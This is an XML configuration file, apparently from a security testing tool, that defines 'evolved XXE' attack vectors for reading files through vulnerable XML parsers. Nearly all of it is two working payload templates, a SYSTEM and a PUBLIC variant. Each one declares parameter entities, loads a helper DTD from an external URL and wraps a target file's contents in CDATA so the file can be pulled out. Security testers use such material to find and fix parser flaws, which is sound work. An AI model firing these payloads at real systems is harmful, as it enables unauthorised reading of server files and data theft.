<config>
<name>FileAccess: Bypassing Restrictions of XXE</name>
<description>This class of attacks vectors is called evolved XXE attacks and is used to (i) bypass restrictions of classic XXE attacks and (ii) for Out-of-Band attacks.</description>
<params>
    <dosbox>false</dosbox>
    <targetFile>true</targetFile>
    <helperURL>true</helperURL>
    <attackListenerURL>false</attackListenerURL>
    <externalResources>true</externalResources>
</params>
<attackvectors>
<attackvector type="system" default="true">
<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY % start "<![CDATA[">
<!ENTITY % goodies SYSTEM "§tf_targetFILE§">
<!ENTITY % end "]]]]><![CDATA[>">
<!ENTITY % dtd SYSTEM "§tf_helperURL§">
%dtd;
]>
<data>&all;</data>]]></directMessage>
<helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
</attackvector>
<attackvector type="public" >
<directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY % start "<![CDATA[">
<!ENTITY % goodies PUBLIC p "§tf_targetFILE§">
<!ENTITY % end "]]]]><![CDATA[>">
<!ENTITY % dtd PUBLIC p1 "§tf_helperURL§">
%dtd;
]>
<data>&all;</data>]]></directMessage>
<helperMessage><![CDATA[<!ENTITY all '%start;%goodies;%end;'>]]></helperMessage>
</attackvector>
</attackvectors>
</config>